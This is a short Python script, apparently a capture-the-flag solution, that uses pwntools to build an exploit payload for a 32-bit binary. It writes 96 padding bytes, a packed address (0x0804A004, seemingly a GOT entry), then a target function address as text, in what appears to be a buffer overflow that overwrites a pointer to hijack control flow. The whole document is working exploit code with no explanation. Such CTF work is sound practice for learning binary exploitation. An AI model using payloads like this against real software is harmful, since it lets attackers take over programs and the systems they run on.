import sys
from pwn import *

payload = 'a'*96 + p32(0x0804A004) + '\n'
payload += str(0x080485d7)+'\n'
sys.stdout.write(payload)
